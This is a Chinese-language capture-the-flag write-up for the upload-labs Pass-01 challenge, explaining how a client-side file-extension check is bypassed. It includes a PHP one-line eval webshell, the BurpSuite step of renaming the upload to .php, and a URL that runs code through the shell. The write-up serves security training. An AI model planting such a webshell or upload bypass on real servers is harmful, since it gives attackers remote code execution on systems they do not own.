## [[upload-labs](https://github.com/c0ny1/upload-labs)] [[Pass-01](http://127.0.0.1/Pass-01/index.php)] [[解题报告](http://exp-blog.com/2019/05/26/pid-3827/)]

------

## 题目

```php
function checkFile() {
    var file = document.getElementsByName('upload_file')[0].value;
    if (file == null || file == "") {
        alert("请选择要上传的文件!");
        return false;
    }
    //定义允许上传的文件类型
    var allow_ext = ".jpg|.png|.gif";
    //提取上传文件的类型
    var ext_name = file.substring(file.lastIndexOf("."));
    //判断上传文件类型是否允许上传
    if (allow_ext.indexOf(ext_name + "|") == -1) {
        var errMsg = "该文件不允许上传，请上传" + allow_ext + "类型的文件,当前文件类型为：" + ext_name;
        alert(errMsg);
        return false;
    }
}
```

------

## 解题

从源码很明显可以知道，代码只对上传的 **文件名后缀** 做检验，因此可以 **从客户端绕过** 。

伪造一个图片文件，文件名为 `payload.png` ，内容为 PHP 的一句话木马 ：

```php
<?php eval(@$_GET['exp']); ?>
```

上传此文件后，因为文件后缀为 `.png` ，所以即使打开图片也无法解析 PHP 代码。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/upload-labs/Pass-01/imgs/01.png)

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/upload-labs/Pass-01/imgs/02.png)


要绕过其实很简单，只需要用 BurpSuite 拦截上传文件的 POST 请求，然后修改 POST 内容中的文件名，把 `payload.png` 修改成 `payload.php` （注意 `Content-Type` 要确保为图片类型）。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/upload-labs/Pass-01/imgs/03.png)

上传成功后，访问改名后的 `payload.php` 文件，并利用一句话木马执行 `phpinfo();` 命令：

```html
http://upload.labs/upload/payload.php?exp=phpinfo();
```

解析 `phpinfo();` 命令成功，完成挑战。

![](https://github.com/lyy289065406/CTF-Solving-Reports/blob/master/upload-labs/Pass-01/imgs/04.png)

------

## 版权声明

　[![Copyright (C) 2016-2019 By EXP](https://img.shields.io/badge/Copyright%20(C)-2016~2019%20By%20EXP-blue.svg)](http://exp-blog.com)　[![License: GPL v3](https://img.shields.io/badge/License-GPL%20v3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
  

- Site: [http://exp-blog.com](http://exp-blog.com) 
- Mail: <a href="mailto:289065406@qq.com?subject=[EXP's Github]%20Your%20Question%20（请写下您的疑问）&amp;body=What%20can%20I%20help%20you?%20（需要我提供什么帮助吗？）">289065406@qq.com</a>


------
